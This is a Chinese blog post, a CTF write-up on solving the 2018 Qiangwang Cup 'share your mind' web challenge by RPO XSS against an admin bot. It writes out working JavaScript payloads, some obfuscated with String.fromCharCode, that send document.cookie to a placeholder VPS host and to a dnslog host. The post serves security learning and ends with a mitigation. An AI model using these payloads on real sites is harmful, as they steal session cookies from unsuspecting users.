@@ -1,0 +1,153 @@
+---
+layout:     post
+title:      "强网杯CTF wtiteup之share your mind"
+subtitle:   " \"安全研究\""
+date:       2018-03-27 22:30:32
+author:     "y1r0nz"
+header-img: "img/hack.jpg"
+tags:
+    - 安全研究
+    - CTF
+    - 渗透经历
+---
+
+
+
+#### 0x01 前言
+
+​	强网杯CTF online初赛已经告一段落，首先还是要感谢和跪舔一波公司战队所有的小伙伴，解题过程虽然烧脑但很精彩，2000个比赛战队情况下一度杀入前40。
+
+​	早在比赛之前我就认为第二届相比第一届名次的角逐会更加激烈，对自己的失望也和期望基本一致，但也并不意味着我完全对玩ctf失去了兴趣。正因为参与了比赛并在比赛中尽力解出属于自己的题目，在赛后看看别人家的writeup，才可以根据这些思路总结下比赛经历并将其运用在其他地方。所以，经历这些过程之后的成长才是最重要的。
+
+​	比赛期间自己在share your mind这题上Fuzz的时间最多，最终也没有想到思路，看了赛后大佬的writeup才后知后觉，这里简要的总结下吧。
+
+— 
+
+#### 0x02 关于做share your mind这题自己的一些心得
+
+* 漏洞挖掘以及RPO XSS成因
+
+​	首先这题是一道web题，初步看了下提示以后就开始做了。
+
+   ![share your mind1](https://github.com/yangrz/blog/raw/gh-pages/img/share your mind1.png)	
+
+​	根据这题的提示来到题目主页，这里要求输入用户名密码，注册了个账户发现能用便进去一看究竟了。
+
+![share your mind2](https://github.com/yangrz/blog/raw/gh-pages/img/share your mind2.png)
+
+​	来到主页report页面中发现了这样一个输入框，网站开发人员想要你把存在问题的页面链接提交给后台给他处理。大多数老铁和司机们看到这里基本上可以断定这题是一个xss盲打后台管理员cookie的了。
+
+![share your mind3](https://github.com/yangrz/blog/raw/gh-pages/img/share your mind4.png)
+
+​	由于后台用的phantomjs写的xss bot（类似假的管理员机器人，xss打过去基本上秒回那种），这里随便构造一下有本站地址的url然后把xss payload放到后面打过去，发现后台确实可以成功访问自己的dnslog服务器。
+
+![share your mind4](https://github.com/yangrz/blog/raw/gh-pages/img/share your mind3.png)
+
+​	由于本熊对xss的了解仅停留在写poc水平，还没对如何利用进行过深入研究过，但是根据题目hint1提示说xss的点根本不在report页面，所以我也就没在fuzzing payload上花更多的功夫。所以，后面的过程一直在寻找xss注入点，在寻找的过程中还发现了一枚彩蛋~ 
+
+![share your mind5](https://github.com/yangrz/blog/raw/gh-pages/img/share your mind5.png)
+
+发现网站使用了php的htmlspecialchar函数并开启ENT_QUOTES开关对所有输出进行了过滤，也就是说html编码了尖括号和单双引号。。当我看到这个函数以为找到了突破口，过滤函数是可以绕过，并且确定xss绝对在这```http://39.107.33.96:20000/index.php/view/article/你发布文章的id```但是一直没有找到输出内容不在html标签之内的地方，所以当时的思路就一直卡在这里。。
+
+​	在看了[Ph0rse大佬写的writeup](https://xianzhi.aliyun.com/forum/topic/2220#toc-2)后才知道原来发布文章不写标题只写内容在view文章页面是直接打印的内容，而两个都写了的话是把文章标题和内容都输出在html标签之间的，看看下面两张图就明白了。
+
+![share your mind6](https://github.com/yangrz/blog/raw/gh-pages/img/share your mind6.png)
+
+![share your mind7](https://github.com/yangrz/blog/raw/gh-pages/img/share your mind7.png)
+
+好了，我们确定了xss输入点以后怎么触发这个xss呢，答案很隐蔽，用RPO XSS方式。首先我们来了解下RPO(relative path overwrite)即相对路径覆盖结合xss这种漏洞的成因，在漏洞利用之前首先需要掌握php url的一些冷知识。那就是phpinfo url，类似url重写。
+
+​	根据[Wiki](https://zh.wikipedia.org/wiki/URL%E9%87%8D%E5%AF%AB)里面对url重写的解释：url rewrite是一种REST的相关技术，它可以在 Web Server 中，针对用户所提供的 URL 进行转换后，再传入 Web Server 中的程序处理器。这里可以知道url重写其实就是将常见携带参数形式的url重写为不携带参数的伪静态形式，在题目中可以反映为：
+
+ ```http://39.107.33.96:20000/index.php/view/article/1494```==```http://39.107.33.96:20000/index.php?methode=view&article=1494```
+
+这样的形式。
+
+在php的特性中%2f会被直接解析为斜杠，在通常情况下```http://39.107.33.96:20000/index.php/view/article/1494/..%2f..%2f..%2f..%2findex.php```代表```http://39.107.33.96:20000/index.php/view/article/1494/../../../../index.php```即在浏览器解析为向上跳了三层目录并使用新的index.php覆盖掉原来的index.php目录。说到这里我们思考下，假如服务端开启了phpinfo url呢？会不会无视php目录跳转的特性直接把```..%2f..%2f..%2f..%2findex.php```当作参数进行解析？答案是肯定的。
+
+我们从前端代码中可以发现jquery.min.js这个文件是使用的相对路径的方式引入到index.php页面中。
+
+![share your mind8](https://github.com/yangrz/blog/raw/gh-pages/img/share your mind8.png)
+
+浏览器将```http://39.107.33.96:20000/index.php/view/article/1494/..%2f..%2f..%2f..%2findex.php```将解析为```http://39.107.33.96:20000/index.php/view/article/1494/..%2f..%2f..%2f..%2findex.php/static/js/jquery.min.js```这种形式。从而导致最终访问```http://39.107.33.96:20000/index.php/static/js/jquery.min.js```这个页面，那本质上请求的是什么呢，其实还是```http://39.107.33.96:20000/index.php/view/article/1494```这篇文章的内容，绿盟那篇文章解释得很清楚：__客户端浏览器在加载相对路径文件时是以最后一个/为相对目录加载具体资源文件的__。只是将这篇文章的内容引入到了jquery.min.js，从而让浏览器误以为文章的内容就是这个js文件。
+
+![share your mind9](https://github.com/yangrz/blog/raw/gh-pages/img/share your mind9.png)
+
+下面可以来实验一下，在write article页面写入alert(1)这种js语句。然后构造上述请求，最终触发xss。
+
+```http://39.107.33.96:20000/index.php/view/article/1493/..%2f..%2f..%2f..%2findex.php```
+
+![share your mind10](https://github.com/yangrz/blog/raw/gh-pages/img/share your mind10.png)
+
+我们可以f12看下浏览器的请求形式
+
+![share your mind11](https://github.com/yangrz/blog/raw/gh-pages/img/share your mind11.png)
+
+显然，alert(1)这条语句最终引入到jquery.min.js中并覆盖掉原文件内容，浏览器误以为jquery.min.js 中的内容为alert(1)导致js脚本被执行。
+
+* 漏洞最终利用
+
+有了RPO XSS这个核武器，接下来就可以构造rpxss payload的exp脚本了。之前有提到服务端对所有输出到页面的字符使用了htmlspecialchar函数处理，故不可以使用单引号的。所以这里还有一个知识点就是使用javascript的fromCharCode函数绕过过滤限制。可以构造类似如下payload：
+
+```(new Image()).src = 'http://VPSIP:Port?'+document.cookie```
+
+最终构造的pyaload如下：
+
+```(new Image()).src = String.fromCharCode(104,116,116,112,58,47,47,55,101,52,122,119,48,99,101,121,101,46,105,111,63)+document.cookie;```
+
+从report页面发送到后台，这里code只需要写个脚本跑个md5字典下来进行碰撞猜测就可以得到了
+
+![share your mind12](https://github.com/yangrz/blog/raw/gh-pages/img/share your mind12.png)
+
+打过去就可以得到cookie，然而这里cookie的值提示要打另外一个目录
+
+![share your mind13](https://github.com/yangrz/blog/raw/gh-pages/img/share your mind13.png)
+
+搬砖Ph0rse的代码，exp可以按照下面这种方式用iframe标签的src属性去读本地相对路径。
+
+``````javascript
+var iframe = document.createElement(String.fromCharCode(105,102,114,97,109,101));
+iframe.src = String.fromCharCode(47,81,87,66,95,102,108,52,103,47,81,87,66,47);
+iframe.id = String.fromCharCode(102,114,97,109,101);
+document.body.appendChild(iframe);
+iframe.onload = function (){
+    var c = document.getElementById(String.fromCharCode(102,114,97,109,101)).contentWindow.document.cookie;
+var y1r0nz = document.createElement(String.fromCharCode(108,105,110,107));
+y1r0nz.setAttribute(String.fromCharCode(114,101,108), String.fromCharCode(112,114,101,102,101,116,99,104));
+y1r0nz.setAttribute(String.fromCharCode(104,114,101,102), String.fromCharCode(47,47,55,101,52,122,119,48,46,99,101,121,101,46,105,111,47,63,102,108,97,103,61) + c);
+document.head.appendChild(y1r0nz);
+}
+``````
+
+这段js代码的意思简而言之，在经过浏览器渲染以后就是下述的两行html代码
+
+``` html
+<iframe id="frame" src="/QWB_fl4g/QWB/">
+<link rel="prefetch" href="http://7e4zw0.ceye.io/?flag=document.getElementById(frame).contentWindow.document.cookie">
+```
+
+prefetch属性规定了当前文档在链接文档之前被调用
+
+提交到后台便在dnslog上得到flag了^_^
+
+![share your mind13](https://github.com/yangrz/blog/raw/gh-pages/img/share your mind15.png)
+
+— 
+
+#### 0x03 总结&修复方案
+
+ctf的题烧脑，但是每一题的干货特别多。这题主要三个考点：
+
+* 掌握通过xss bot盲打后台获取session的常见套路
+* phpinfo url形式如何通过相对路径覆盖的方式触发xss payload
+* 使用fromCharCode函数绕过htmlspecialchar函数的单引号过滤
+
+浏览器和服务器这种误差是在现阶段内无法及时解决的，涉及到双方各自的应用标准。目前看来，比较直接的解决办法就是在页面中避免直接使用相对路径进行静态文件的加载了。
+
+— 
+
+#### 0x04 参考文献
+
+1. 深入剖析RPO漏洞  [https://xianzhi.aliyun.com/forum/topic/2220#toc-2](https://xianzhi.aliyun.com/forum/topic/2220#toc-2)
+2. Url重写 [https://zh.wikipedia.org/wiki/URL%E9%87%8D%E5%AF%AB](https://zh.wikipedia.org/wiki/URL%E9%87%8D%E5%AF%AB)
+3. RPO技术浅析 [http://blog.nsfocus.net/rpo-attack/](http://blog.nsfocus.net/rpo-attack/)
